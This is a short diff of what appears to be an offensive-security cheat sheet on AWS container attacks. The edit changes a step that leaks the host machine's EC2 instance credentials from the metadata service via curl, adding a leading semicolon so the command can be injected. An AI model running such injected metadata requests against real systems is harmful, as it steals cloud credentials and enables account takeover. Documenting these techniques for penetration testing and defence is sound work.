@@ -1399,10 +1399,10 @@ aws --profile <container_credentials> ecs describe-services --cluster <your_clus
   <img src="/images/cloud/replica.png">
 </p>
 
-* Leak the AWS metadata of the host using the following credentials.
+* Leak the AWS metadata of the **host** machine using the following credentials.
 
 ```bash
-curl http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance
+; curl http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance
 ```
 
 <p align="center">
